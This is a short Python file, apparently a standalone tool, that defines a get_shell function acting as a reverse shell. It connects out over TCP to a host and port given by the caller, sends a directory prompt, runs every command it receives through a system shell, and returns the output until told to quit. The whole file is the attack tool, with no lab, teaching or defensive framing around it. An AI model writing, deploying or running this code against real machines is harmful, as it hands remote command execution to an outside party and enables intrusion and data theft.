import os
import socket
import subprocess


def get_shell(HOST: str, PORT: int):
    # Selects family IPv4 to connect with TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to host (add timeout?)
    s.connect((HOST, PORT))

    s.send(str.encode("Succesfully connected\n"))

    while 1:
        try:
            s.send(str.encode(os.getcwd() + "> "))
            data = s.recv(1024).decode("UTF-8")
            data = data.strip('\n')
            if data == "quit":
                break
            if data[:2] == "cd":
                os.chdir(data[3:])
            if len(data) > 0:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                output_str = str(stdout_value, "UTF-8")
                s.send(str.encode("\n" + output_str))
        except Exception as e:
            continue

    s.close()